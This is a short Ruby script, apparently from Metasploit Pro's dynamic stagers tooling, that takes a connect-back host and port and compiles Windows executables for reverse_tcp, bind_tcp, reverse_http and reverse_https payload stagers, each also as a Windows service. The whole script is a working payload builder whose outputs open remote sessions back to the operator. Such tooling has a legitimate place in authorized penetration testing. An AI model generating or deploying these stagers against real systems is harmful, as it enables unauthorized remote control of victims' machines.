#!/usr/bin/ruby

###
# ./ruby compile.rb
# Compiles all the **.c.template files in this directory
###

msfbase = File.expand_path(File.join(File.dirname(__FILE__), '..', '..', 'msf3', 'lib'))
enginebase = File.expand_path(File.join(File.dirname(__FILE__), '..', 'lib'))
$:.unshift(msfbase)
$:.unshift(enginebase)

require 'active_support/all'
require 'rex/text'
require 'rubygems'
require 'metasm/metasm'
require 'optparse'
require 'pro/dynamic_stagers/dynamic_stagers'

template_subs = {}

myopts = OptionParser.new do |opts|
  opts.banner = "Usage: example.rb [options]"

  opts.on("--host <HOST>", "Host for Connect-Back Payloads") do |host|
    template_subs[:HOST] = host
  end

  opts.on("--port <PORT>", "Port for the payload to use") do |port|
    template_subs[:PORT] = port
  end

end

myopts.parse!

if template_subs[:HOST].nil? or template_subs[:HOST].empty?
  puts myopts.help
  raise OptionParser::MissingArgument
end

if template_subs[:PORT].nil? or template_subs[:PORT].empty?
  puts myopts.help
  raise OptionParser::MissingArgument
end

["reverse_tcp", "bind_tcp", "reverse_http", "reverse_https"].each do |stager_name|

  generator_opts = { host: template_subs[:HOST], port: template_subs[:PORT], stager: stager_name }
  exe_generator = ::Pro::DynamicStagers::EXEGenerator.new(generator_opts )
  exe = exe_generator.compile
  exe.encode_file("#{stager_name}.exe")

  generator_opts[:service] = true
  exe_generator = ::Pro::DynamicStagers::EXEGenerator.new(generator_opts )
  exe = exe_generator.compile
  exe.encode_file("#{stager_name}-svc.exe")

end


